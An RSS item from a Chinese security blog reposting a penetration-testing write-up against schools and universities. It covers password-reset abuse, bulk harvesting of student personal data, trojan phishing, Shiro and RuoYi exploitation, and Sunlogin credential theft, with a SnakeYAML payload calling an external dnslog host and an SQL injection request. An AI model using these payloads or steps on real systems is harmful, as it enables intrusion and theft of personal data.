<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>学习 - 分类 - bysec</title>
        <link>https://www.bysec.cn/categories/%E5%AD%A6%E4%B9%A0/</link>
        <description>学习 - 分类 - bysec</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/categories/%E5%AD%A6%E4%B9%A0/" rel="self" type="application/rss+xml" /><item>
    <title>教育行业渗透打点</title>
    <link>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
    <pubDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
</blockquote>
<p>1、OA系统密码找回 找回密码 系统使用说明文档中发现登录账号 600030 密码找回，找回方式选择密保问题 问题选择出生地，密保问题答案填写高校所在地 即可修改密码 修改密码，即可以图文信息&hellip;</p>
<h2 id="1oa系统密码找回" class="headerLink">
    <a href="#1oa%e7%b3%bb%e7%bb%9f%e5%af%86%e7%a0%81%e6%89%be%e5%9b%9e" class="header-mark"></a>1、OA系统密码找回</h2><h2 id="找回密码" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81" class="header-mark"></a>找回密码</h2><p>系统使用说明文档中发现登录账号 600030</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666775791525-1c126349-2202-42fd-9a89-7d5b5d917a82.png">
        
    </a></p>
<p>密码找回，找回方式选择密保问题</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782192496-e3391625-a883-4558-96a5-d9287dafdd72.png">
        
    </a></p>
<p>问题选择出生地，密保问题答案填写高校所在地</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782236889-c5af4e14-b3d5-4a4f-a5ac-c5870cec4ef6.png">
        
    </a></p>
<p>即可修改密码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782270036-dd92b124-42c8-4c31-bec3-4344f3ef2fe8.png">
        
    </a></p>
<p>修改密码，即可以图文信息中心的身份登录OA系统</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782348299-f7bb13b4-467d-47d1-a106-221e3b6863b5.png">
        
    </a></p>
<p>在文件中找到1400多名学生的敏感信息文件，其中存在手机号、身份证号、学号，可以组合密码本进行统一身份认证系统的爆破登录，默认密码为身份证后六位</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" title="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047220884-77a1800e-06da-4a5b-a8b9-ccd1350d6282.png">
        
    </a></p>
<p>成功登录一部分账号</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782677385-5f2d487d-7c57-45dc-96d6-f1749cf063e7.png">
        
    </a></p>
<h2 id="登录vpn" class="headerLink">
    <a href="#%e7%99%bb%e5%bd%95vpn" class="header-mark"></a>登录VPN</h2><p>进行内网扫描，利用MS17010拿下C段多台主机权限</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666782825185-9bd6f3fe-4795-494c-bbf8-a2064e9f4bbb.png">
        
    </a></p>
<h2 id="钓鱼" class="headerLink">
    <a href="#%e9%92%93%e9%b1%bc" class="header-mark"></a>钓鱼</h2><p>利用OA系统的通讯功能，散播木马</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666766321747-dbe583f0-d473-4618-8645-f4f98c3d817a.png">
        
    </a></p>
<p>获取多台机器权限</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666780943055-33066525-fdc1-4924-8d5e-3d8867069828.png">
        
    </a></p>
<h2 id="2逻辑漏洞修改密码" class="headerLink">
    <a href="#2%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>2、逻辑漏洞修改密码</h2><h2 id="github密码泄漏" class="headerLink">
    <a href="#github%e5%af%86%e7%a0%81%e6%b3%84%e6%bc%8f" class="header-mark"></a>GitHub密码泄漏</h2><p>GitHub泄漏学号密码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200212811-c7aa12ab-eb19-41e4-8cab-db0df84b16a7.png">
        
    </a></p>
<p>但账号已被禁用</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1664518168248-4d794161-a720-4148-a179-1c1b94efd0a2.png">
        
    </a></p>
<h2 id="获取学号手机号" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e5%ad%a6%e5%8f%b7%e6%89%8b%e6%9c%ba%e5%8f%b7" class="header-mark"></a>获取学号手机号</h2><p>存在注册功能的网站注册用户，然后登录</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201842509-aac31bc8-c47b-4f56-ac13-ac6d3b2490a3.png">
        
    </a></p>
<p>通过以下接口获得用户ID /User/GetUserListByKeyWord</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200534018-d07e8ccc-786d-4712-967a-8a610da7418d.png">
        
    </a></p>
<p>可以通过以下接口遍历用户ID，获取任意用户的姓名 手机号 邮箱等敏感信息</p>
<p>/User/Tip?time61&amp;id=caec35e7-9956-4f68-98bc-e2aee73ebda5&amp;_=1664438691592</p>
<p>获取多组学号、姓名、手机号</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200674289-381d7e0a-b93b-40bc-89a1-5cef6dd1b5cb.png">
        
    </a></p>
<h2 id="修改密码" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e5%af%86%e7%a0%81" class="header-mark"></a>修改密码</h2><p>点击同意门户的忘记密码功能，输入上面得到的学号</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667200912768-8f924e2a-d7c5-4d98-a402-26c5326a12c1.png">
        
    </a></p>
<p>输入手机号，点击获取验证码并抓包</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201140457-9941c680-343d-42d8-85d1-b927be6cd1d0.png">
        
    </a></p>
<p>记录回包内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;datas&#34;</span><span class="o">:</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">sign</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">407ec6dc275f4766a4525e059a60ca16</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">,</span><span class="s2">&#34;code&#34;</span><span class="o">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;message&#34;</span><span class="o">:</span><span class="s2">&#34;获取成功&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201361960-319757da-c444-48cc-8d94-a7ff6a3c7f9c.png">
        
    </a></p>
<p>可以看到页面跳转到了设置密码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667215585917-a4645a85-62b7-4f97-afd9-b591cbd3fd30.png">
        
    </a></p>
<p>成功更改密码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1667201482253-82f0211c-3338-463c-931f-f21a27deeb02.png">
        
    </a></p>
<p>79个应用，通过其中一个aspx站SQL注入拿到shell</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" title="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/2856486/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png">
        
    </a></p>
<h2 id="3github泄漏账号密码" class="headerLink">
    <a href="#3github%e6%b3%84%e6%bc%8f%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>3、Github泄漏账号密码</h2><h2 id="账号密码" class="headerLink">
    <a href="#%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>账号密码</h2><p>1、GitHub搜索&quot;学校域名&quot; &ldquo;password&rdquo; 发现邮箱账号密码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png">
        
    </a></p>
<p>2、登录邮箱发现手机号身份证号</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png">
        
    </a></p>
<h2 id="统一门户" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7" class="header-mark"></a>统一门户</h2><p>3、手机号加邮箱密码直接登录统一门户</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png">
        
    </a></p>
<h2 id="泛微oa" class="headerLink">
    <a href="#%e6%b3%9b%e5%be%aeoa" class="header-mark"></a>泛微OA</h2><p>跳转到泛微OA,文件上传GetShell</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png">
        
    </a></p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png">
        
    </a></p>
<h2 id="4向日葵密码读取" class="headerLink">
    <a href="#4%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>4、向日葵密码读取</h2><h2 id="heapdump文件泄漏" class="headerLink">
    <a href="#heapdump%e6%96%87%e4%bb%b6%e6%b3%84%e6%bc%8f" class="header-mark"></a>heapdump文件泄漏</h2><p>直接下载heapdump文件</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png">
        
    </a></p>
<p>读取到mssql账号密码</p>
<h2 id="向日葵密码读取" class="headerLink">
    <a href="#%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>向日葵密码读取</h2><p>成功连接mssql服务器，执行xp_cmdshell</p>
<p>C:\Program Files\Oray\SunLogin\SunloginClient\config.ini为向日葵的默认安装配置文件，直接尝试读取</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png">
        
    </a></p>
<p>fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png">
        
    </a></p>
<p>可以使用GitHub解密项目<a href="https://github.com/wafinfo/Sunflower_get_Password" target="_blank" rel="noopener noreferrer">https://github.com/wafinfo/Sunflower_get_Password</a>进行解密。</p>
<p>解密后成功连接目标主机服务器</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png">
        
    </a></p>
<h2 id="5若依漏洞getshell" class="headerLink">
    <a href="#5%e8%8b%a5%e4%be%9d%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>5、若依漏洞GetShell</h2><p>1、某学院首页</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png">
        
    </a></p>
<p>2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png">
        
    </a></p>
<h2 id="定时任务命令执行" class="headerLink">
    <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>定时任务命令执行</h2><p>以管理员权限登录在定时任务处新增</p>
<p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&ldquo;<a href="ftp://ceshi.bdtmos.dnslog.cn" target="_blank" rel="noopener noreferrer">ftp://ceshi.bdtmos.dnslog.cn</a>&rdquo;] ]] ]&rsquo;)运行任务</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png">
        
    </a>DNSlog平台收到请求</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png">
        
    </a></p>
<h2 id="shiro-反序列化漏洞" class="headerLink">
    <a href="#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>shiro 反序列化漏洞</h2><p>工具直接开扫，成功注入内存马</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png">
        
    </a></p>
<p>连接内存马</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png">
        
    </a></p>
<p>发现历史入侵痕迹，发现fscan黑客漏扫工具</p>
<p><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" title="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/2856486/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png">
        
    </a></p>
<h2 id="sql注入" class="headerLink">
    <a href="#sql%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入</h2><p>sql注入当时也懒得去尝试，估计也是存在的</p>
<p>/system/role/list</p>
<p>/system/role/export</p>
<p>/system/dept/edit</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">system</span><span class="o">/</span><span class="nx">role</span><span class="o">/</span><span class="k">list</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="nx">Host</span><span class="o">:</span> <span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span> <span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span> <span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">84.0</span><span class="o">.</span><span class="mf">4147.105</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span> <span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">signed</span><span class="o">-</span><span class="nx">exchange</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">b3</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span> <span class="nx">same</span><span class="o">-</span><span class="nx">origin</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span> <span class="nx">navigate</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span> <span class="o">?</span><span class="mi">1</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span> <span class="nx">document</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Cookie</span><span class="o">:</span> <span class="nx">JSESSIONID</span><span class="o">=</span><span class="nx">e9f143b9</span><span class="o">-</span><span class="mi">3</span><span class="nx">c3d</span><span class="o">-</span><span class="mi">4</span><span class="nx">acb</span><span class="o">-</span><span class="mi">96</span><span class="nx">a4</span><span class="o">-</span><span class="mi">93</span><span class="nx">c7367a98e9</span> <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">75</span> <span class="nx">params</span><span class="p">[</span><span class="nx">dataScope</span><span class="p">]</span><span class="o">=</span><span class="k">and</span> <span class="nx">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="nx">select</span> <span class="nx">database</span><span class="p">()),</span><span class="mh">0x7e</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
